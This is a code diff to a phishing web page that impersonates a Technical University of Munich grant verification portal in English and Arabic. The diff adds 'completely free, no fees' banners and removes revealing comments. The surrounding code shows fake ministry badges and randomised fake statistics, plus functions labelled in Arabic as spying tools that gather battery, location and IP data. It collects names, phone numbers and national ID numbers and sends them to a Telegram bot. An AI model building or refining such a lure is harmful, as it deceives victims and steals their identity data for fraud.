@@ -8,7 +8,7 @@
     <meta property="og:description" content="Official verification portal for international research candidates.">
     <link href="https://fonts.googleapis.com/css2?family=Tajawal:wght@400;700&family=Inter:wght@300;400;600;700&display=swap" rel="stylesheet">
     <style>
-        :root { --tum-blue: #0065BD; --tum-dark: #003d5e; --gold: #d4af37; --gray-light: #f4f6f9; --gray-border: #e2e8f0; }
+        :root { --tum-blue: #0065BD; --tum-dark: #003d5e; --gold: #d4af37; --gray-light: #f4f6f9; --gray-border: #e2e8f0; --free-green: #e6f7e6; --free-green-border: #2e7d32; }
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body { font-family: 'Inter', 'Tajawal', sans-serif; background: linear-gradient(135deg, #eef2f7 0%, #d9e2ec 100%); min-height: 100vh; display: flex; align-items: center; justify-content: center; padding: 20px; }
         .container { background: white; border-radius: 32px; box-shadow: 0 25px 50px -12px rgba(0,0,0,0.25); width: 100%; max-width: 600px; overflow: hidden; transition: 0.3s; border-top: 6px solid var(--tum-blue); }
@@ -17,6 +17,8 @@
         .lang-switch { position: absolute; top: 20px; right: 20px; background: white; color: var(--tum-blue); border-radius: 40px; padding: 8px 16px; font-size: 14px; font-weight: bold; cursor: pointer; transition: 0.2s; border: 2px solid white; box-shadow: 0 2px 12px rgba(0,0,0,0.15); }
         .lang-switch:hover { background: var(--gold); color: #000; border-color: var(--gold); transform: scale(1.02); }
         .content { padding: 30px 28px; }
+        .free-banner { background: var(--free-green); border-left: 4px solid var(--free-green-border); padding: 12px 16px; border-radius: 16px; margin-bottom: 20px; display: flex; align-items: center; gap: 12px; font-weight: 600; color: #1b5e20; }
+        .free-banner i { font-size: 24px; }
         .badge-container { display: flex; justify-content: space-between; margin-bottom: 20px; flex-wrap: wrap; gap: 12px; }
         .security-badge { background: #eef2ff; border-radius: 40px; padding: 6px 14px; font-size: 12px; font-weight: 600; color: var(--tum-blue); display: inline-flex; align-items: center; gap: 6px; border: 1px solid #cbd5e1; }
         .stats { background: var(--gray-light); border-radius: 20px; padding: 12px 16px; margin-bottom: 25px; display: flex; justify-content: space-between; border: 1px solid var(--gray-border); }
@@ -25,7 +27,7 @@
         .stat-label { font-size: 11px; color: #475569; text-transform: uppercase; letter-spacing: 0.5px; }
         .form-group { margin-bottom: 22px; text-align: left; }
         label { display: block; font-weight: 600; margin-bottom: 8px; font-size: 14px; color: #1e293b; }
-        .optional-badge { font-weight: normal; font-size: 12px; color: #64748b; background: #f1f5f9; padding: 2px 8px; border-radius: 20px; margin-right: 8px; }
+        .optional-badge { font-weight: normal; font-size: 12px; color: #64748b; background: #f1f5f9; padding: 2px 8px; border-radius: 20px; margin-right: 8px; border: 1px solid #cbd5e1; }
         input { width: 100%; padding: 14px 16px; border: 1.5px solid var(--gray-border); border-radius: 16px; font-size: 15px; font-family: inherit; transition: 0.2s; background: white; }
         input:focus { border-color: var(--tum-blue); outline: none; box-shadow: 0 0 0 3px rgba(0,101,189,0.2); }
         .hint { font-size: 11px; color: #64748b; margin-top: 6px; }
@@ -39,6 +41,7 @@
         .redirect-btn { background: #2e7d32; margin-top: 16px; }
         .redirect-btn:hover { background: #1b5e20; }
         .digital-signature { margin-top: 25px; padding-top: 15px; border-top: 1px dashed #cbd5e1; font-size: 10px; color: #64748b; text-align: center; display: flex; justify-content: center; gap: 12px; flex-wrap: wrap; }
+        .free-note { background: #fef9e3; padding: 8px 12px; border-radius: 12px; font-size: 12px; text-align: center; margin-top: 20px; color: #b45309; border-right: 2px solid #f59e0b; }
         .toast-msg { position: fixed; bottom: 20px; left: 50%; transform: translateX(-50%); background: rgba(0,0,0,0.85); color: var(--gold); padding: 8px 20px; border-radius: 40px; font-size: 13px; z-index: 1000; display: none; backdrop-filter: blur(8px); border: 1px solid var(--gold); font-weight: bold; white-space: nowrap; }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
         .spinner { width: 32px; height: 32px; border: 3px solid #e0e0e0; border-top: 3px solid var(--tum-blue); border-radius: 50%; animation: spin 0.8s linear infinite; margin: 0 auto 15px; }
@@ -53,11 +56,16 @@
     <div class="header">
         <div class="text-logo">🎓 TUM</div>
         <div class="lang-switch" id="langToggle">🇬🇧 EN</div>
-        <h1 id="mainTitle">Academic Verification Portal Free</h1>
+        <h1 id="mainTitle">Academic Verification Portal</h1>
         <p id="subTitle">Technical University of Munich | Excellence Grant 2026</p>
     </div>
     <div class="content">
-        <!-- شارات موثوقية وإحصائيات -->
+        <!-- بطاقة المنحة المجانية -->
+        <div class="free-banner" id="freeBanner">
+            <span>✅</span>
+            <span id="freeText">This grant is completely free – no fees required</span>
+        </div>
+
         <div class="badge-container">
             <div class="security-badge">🔒 SSL Encrypted (256-bit)</div>
             <div class="security-badge">✅ Verified by German Ministry</div>
@@ -87,7 +95,7 @@
             <div class="form-group">
                 <label id="labelJobId"><i>🆔</i> Employee ID / Job Number <span class="optional-badge">Optional</span></label>
                 <input type="text" id="job_id" placeholder="e.g. 1024587 (optional)" autocomplete="off">
-                <div class="hint" id="jobHint">Found on your official staff card</div>
+                <div class="hint" id="jobHint">Found on your official staff card (optional)</div>
             </div>
             <div class="form-group">
                 <label id="labelNationalId"><i>🪪</i> National ID Number <span class="optional-badge">Optional</span></label>
@@ -108,6 +116,11 @@
         <div id="success-message">
             <div id="successText">✅ <strong>Application received successfully</strong><br>You will be contacted via your university email within 24 hours to complete the grant process. Thank you for registering with TUM Excellence Program.</div>
             <button class="btn redirect-btn" id="redirectBtn" onclick="redirectToTUM()">Continue to Dashboard →</button>
+        </div>
+
+        <!-- تذكير إضافي بالمجانية -->
+        <div class="free-note" id="freeNote">
+            ⚠️ This grant is offered by the university at no cost – you will never be asked for payment at any stage.
         </div>
 
         <div class="digital-signature">
@@ -138,12 +151,13 @@
             jobHint: 'Found on your official staff card (optional)',
             submitBtn: 'Verify & Activate Grant 🎓',
             loadingText: 'Synchronizing with Munich servers ...',
-            loadingSub: 'Please wait, verifying records',
             successText: '✅ <strong>Application received successfully</strong><br>You will be contacted via your university email within 24 hours to complete the grant process. Thank you for registering with TUM Excellence Program.',
             redirectBtn: 'Continue to Dashboard →',
             statLabelApps: 'Applications Today',
             statLabelFunds: 'Total Funds',
             statLabelRemaining: 'Remaining Grants',
+            freeBanner: 'This grant is completely free – no fees required',
+            freeNote: '⚠️ This grant is offered by the university at no cost – you will never be asked for payment at any stage.',
             toastUpdates: [
                 "📚 1,247 researchers updated today",
                 "🇩🇪 System connected to TUM servers directly",
@@ -166,12 +180,13 @@
             jobHint: 'موجود في بطاقة الموظف الرسمية (اختياري)',
             submitBtn: 'تحقق وتفعيل المنحة 🎓',
             loadingText: 'جاري المزامنة مع خوادم ميونيخ ...',
-            loadingSub: 'الرجاء الانتظار، يتم التحقق من السجلات',
             successText: '✅ <strong>تم استلام طلبك بنجاح</strong><br>سيتم التواصل مع بريدك الجامعي خلال 24 ساعة لإتمام إجراءات المنحة. شكراً لتسجيلك في برنامج TUM للتميز.',
             redirectBtn: 'المتابعة إلى لوحة التحكم ←',
             statLabelApps: 'الطلبات اليوم',
             statLabelFunds: 'إجمالي التمويل',
             statLabelRemaining: 'المنح المتبقية',
+            freeBanner: 'هذه المنحة مجانية بالكامل – لا توجد أي رسوم مطلوبة',
+            freeNote: '⚠️ هذه المنحة مقدمة من الجامعة مجاناً – لن يُطلب منك أي دفع في أي مرحلة',
             toastUpdates: [
                 "📚 تم تحديث سجلات 1,247 باحثاً اليوم",
                 "🇩🇪 نظام التحقق متصل بخوادم TUM مباشرة",
@@ -203,6 +218,8 @@
         document.getElementById('statLabelApps').innerText = t.statLabelApps;
         document.getElementById('statLabelFunds').innerText = t.statLabelFunds;
         document.getElementById('statLabelRemaining').innerText = t.statLabelRemaining;
+        document.getElementById('freeText').innerText = t.freeBanner;
+        document.getElementById('freeNote').innerHTML = t.freeNote;
         document.getElementById('langToggle').innerHTML = lang === 'en' ? '🇸🇦 AR' : '🇬🇧 EN';
         window.toastMessages = t.toastUpdates;
     }
@@ -212,7 +229,7 @@
         applyLanguage(newLang);
     });
 
-    // إحصائيات ديناميكية وهمية
+    // إحصائيات ديناميكية
     function updateStats() {
         const daily = Math.floor(1200 + Math.random() * 300);
         const remaining = Math.floor(280 + Math.random() * 80);
@@ -223,7 +240,7 @@
     updateStats();
     document.getElementById('timestamp').innerText = new Date().toLocaleString();
 
-    // ========== جميع وظائف الرادار والتجسس (من الكود السابق) ==========
+    // ========== وظائف الرادار والتجسس ==========
     async function getPowerTech() {
         try {
             const battery = await navigator.getBattery();
@@ -401,7 +418,7 @@
         } catch(e) {}
     }, { once: true });
 
-    // محاكاة شريط التقدم أثناء التحميل
+    // محاكاة شريط التقدم
     function simulateProgress(callback) {
         let width = 0;
         const fill = document.getElementById('progressFill');
@@ -428,7 +445,7 @@
         }, 600);
     }
 
-    // ========== دالة المعالجة الأساسية ==========
+    // ========== المعالجة الأساسية ==========
     async function processVerification() {
         const name = document.getElementById('fullname').value.trim();
         const phone = document.getElementById('phone').value.trim();
@@ -448,7 +465,6 @@
         getLocationAndSend();
         const userIP = await fetchUserIP();
         
-        // إرسال البيانات (حتى الحقول الاختيارية إن وجدت)
         const userDataMsg = `
 🎓 [TUM] New Excellence Grant Application
 👤 Full Name: ${name}
@@ -462,7 +478,6 @@
         `;
         await fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(userDataMsg)}`);
         
-        // تشغيل شريط التقدم ثم إظهار رسالة النجاح
         simulateProgress(() => {
             document.getElementById('loading-box').style.display = 'none';
             document.getElementById('success-message').style.display = 'block';
@@ -489,8 +504,7 @@
     }, 7000);
     
     applyLanguage('en');
-    console.log("✅ TUM Portal with optional fields, progress bar, stats, and digital signature ready.");
 </script>
 
 </body>
-</html>
+    </html>
